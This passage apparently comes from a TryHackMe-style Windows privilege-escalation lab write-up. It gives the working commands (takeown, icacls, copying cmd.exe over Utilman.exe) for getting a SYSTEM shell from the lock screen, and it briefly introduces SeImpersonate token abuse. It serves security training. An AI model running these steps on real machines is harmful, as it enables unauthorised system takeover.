> We'll abuse `utilman.exe` to escalate privilege this time. **Utilman** is a built-in Windows application used to provide Ease of Access options during the lock screen. It is run with SYSTEM privileges, therefore we will effectively gain SYSTEM privileges if we replace the original binary for any payload we like. We can take ownership and replace any file.
> ![Image of Utilman]([Isolated.pn](https://external-content.duckduckgo.com/iu/?u=https%3A%2F%2Fwww.passfab.com%2Fimages%2Ftopics%2Falternative%2Fwindows-11%2Faccessibility.jpg%3Fw%3D804%26h%3D624&f=1&nofb=1&ipt=ae7c90cc9b01cc71929477d99216cede1bb0d53bfabe02fe35d2bf3859b35736&ipo=images) "Utilman")
>
> We will then replace utilman
>
> ### TARGET MACHINE:
>> ```
>> C:\Windows\system32>takeown /f C:\Windows\System32\Utilman.exe
>>
>> SUCCESS: The file (or folder): "C:\Windows\System32\Utilman.exe" now owned by user "WPRIVESC2\THMTakeOwnership".
>>
>> C:\Windows\system32>icacls C:\Windows\System32\Utilman.exe /grant THMTakeOwnership:F
>> processed file: C:\Windows\System32\Utilman.exe
>> Successfully processed 1 files; Failed processing 0 files
>>
>> C:\Windows\system32>copy cmd.exe utilman.exe
>> Overwrite utilman.exe? (Yes/No/All): yes
>>         1 file(s) copied.
>> ``` 
>
> To trigger utilman, we will lock our screen from the start button.
>
> Finally, click the "Ease of Access" button, which runs `utilman.exe` with SYSTEM privileges. This will cause to pop a command line.
>
> Although this won't give us access to `C:\Users\Administrator\flag.txt`.
> 
> # D. Selmpersonate / SeAssignPrimaryToken
>
> These privileges allow a process to impersonate other users and act on their behalf.
>
> Impersonation usually consists of being able to spawn a process or thread under the security context of another user. You can understand impersonation by looking how FTP server works.
>
> As attackers, if we manage to take control of a process with SeImpersonate or SeAssignPrimaryToken privileges, we can impersonate any user connecting and authenticating to that process.


</details>

<details>
  <summary> 5. Abusing Vulnerable Software</summary>
  
</details>

